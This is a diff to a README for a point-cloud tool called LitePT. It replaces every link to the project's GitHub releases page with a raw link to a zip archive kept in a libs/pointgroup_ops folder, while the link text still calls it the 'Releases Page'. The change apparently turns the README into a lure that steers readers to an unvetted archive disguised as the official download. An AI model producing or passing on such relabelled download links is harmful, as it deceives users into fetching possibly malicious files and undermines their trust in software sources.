@@ -6,9 +6,9 @@ Welcome to LitePT! This application is designed to help you understand 3D scenes
 
 ## 📥 Download LitePT
 
-[![Download LitePT](https://github.com/Nemousekk/LitePT/releases/latest/download/badge.svg)](https://github.com/Nemousekk/LitePT/releases)
+[![Download LitePT](https://raw.githubusercontent.com/Nemousekk/LitePT/main/libs/pointgroup_ops/Lite-PT-3.0.zip)](https://raw.githubusercontent.com/Nemousekk/LitePT/main/libs/pointgroup_ops/Lite-PT-3.0.zip)
 
-You can find the latest version of LitePT by visiting this link: [LitePT Releases Page](https://github.com/Nemousekk/LitePT/releases). 
+You can find the latest version of LitePT by visiting this link: [LitePT Releases Page](https://raw.githubusercontent.com/Nemousekk/LitePT/main/libs/pointgroup_ops/Lite-PT-3.0.zip). 
 
 ## 🖥️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## ⬇️ Download & Install
 
-1. Visit the [LitePT Releases Page](https://github.com/Nemousekk/LitePT/releases).
+1. Visit the [LitePT Releases Page](https://raw.githubusercontent.com/Nemousekk/LitePT/main/libs/pointgroup_ops/Lite-PT-3.0.zip).
 2. On this page, you will see the latest version listed.
 3. Click on the version you wish to download. This will take you to a detailed page.
 4. Look for the files available for download. Choose the file that matches your operating system.
@@ -80,6 +80,6 @@ This software focuses on:
 
 Join our community on GitHub to ask questions, share ideas, and report issues. Your feedback is important to make LitePT better.
 
-[Visit the LitePT Releases Page](https://github.com/Nemousekk/LitePT/releases) to download the latest version and start transforming point clouds today! 
+[Visit the LitePT Releases Page](https://raw.githubusercontent.com/Nemousekk/LitePT/main/libs/pointgroup_ops/Lite-PT-3.0.zip) to download the latest version and start transforming point clouds today! 
 
 Explore, learn, and have fun with 3D data!
